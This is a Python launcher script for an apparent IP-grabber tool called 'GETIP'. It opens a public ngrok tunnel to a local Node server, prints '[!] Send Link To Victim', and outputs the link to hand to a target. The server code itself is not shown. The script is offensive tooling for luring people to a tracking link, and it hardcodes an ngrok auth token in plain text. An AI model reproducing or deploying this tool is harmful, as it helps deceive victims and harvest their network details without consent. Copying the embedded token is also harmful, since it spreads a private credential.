import os
from pyngrok import ngrok, conf
from url_extractor import url_extract
os.system("cls")

print()
print("  ▄████ ▓█████▄▄▄█████▓ ██▓ ██▓███  ")
print(" ██▒ ▀█▒▓█   ▀▓  ██▒ ▓▒▓██▒▓██░  ██▒")
print("▒██░▄▄▄░▒███  ▒ ▓██░ ▒░▒██▒▓██░ ██▓▒")
print("░▓█  ██▓▒▓█  ▄░ ▓██▓ ░ ░██░▒██▄█▓▒ ▒")
print("░▒▓███▀▒░▒████▒ ▒██▒ ░ ░██░▒██▒ ░  ░")
print(" ░▒   ▒ ░░ ▒░ ░ ▒ ░░   ░▓  ▒▓▒░ ░  ░")
print("  ░   ░  ░ ░  ░   ░     ▒ ░░▒ ░     ")
print("░ ░   ░    ░    ░       ▒ ░░░       ")
print("      ░    ░  ░         ░       v1.0")
print()

print("====================================")
print("+        developed by: mohan putta +")
print("====================================")
print()
print("[!] Send Link To Victim")
conf.get_default().auth_token = "299FED0QV81gQREsrXHLmdey2S2_5saXiXSDzhSgxp6AcWPgf"
url = ngrok.connect(5000, "http")
print("[+] "+ str(url_extract(url)))
os.system("node server.js")